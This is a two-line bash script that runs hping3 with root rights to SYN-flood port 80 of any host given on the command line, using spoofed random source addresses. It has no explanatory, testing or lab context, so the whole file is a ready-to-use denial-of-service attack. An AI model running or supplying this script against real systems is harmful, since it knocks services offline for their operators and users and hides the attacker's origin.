#!/bin/bash
sudo hping3 -S --flood --rand-source -p 80 "$1"